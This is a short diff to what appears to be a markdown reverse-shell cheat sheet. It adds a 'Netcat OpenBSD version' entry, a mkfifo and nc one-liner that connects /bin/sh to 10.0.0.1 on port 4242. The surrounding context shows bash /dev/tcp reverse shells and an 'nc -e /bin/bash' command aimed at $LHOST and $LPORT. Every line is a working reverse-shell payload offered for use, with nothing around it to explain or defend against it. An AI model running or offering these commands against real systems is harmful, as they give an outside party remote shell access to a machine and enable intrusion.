@@ -297,6 +297,11 @@ exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'");
 /bin/bash -c '/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
 ```
 
+### Netcat OpenBSD version
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
+
 ### Netcat
 ```
 nc $LHOST $LPORT -e /bin/bash
